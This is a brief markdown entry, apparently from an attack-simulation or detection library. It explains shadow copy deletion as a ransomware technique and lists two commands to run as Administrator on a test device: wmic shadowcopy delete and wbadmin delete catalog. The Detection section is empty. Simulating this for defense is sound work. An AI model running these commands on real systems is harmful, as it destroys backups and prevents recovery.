# Shadow Copy Delete

Shadow Copy Deletion is a technique where attackers delete or disable built-in Windows shadow copies and recovery services. This prevents system recovery by denying access to backups, making it significantly more challenging for victims to restore corrupted or encrypted data.

## Simulation

Run the following commands in PowerShell / Windows Command Prompt as Administrator on a test device.

### Delete Shadow Copy

```powershell
wmic.exe shadowcopy delete /nointeractive
```

### Delete Windows Backup Catalog

```powershell
wbadmin delete catalog -quiet
```

## Detection
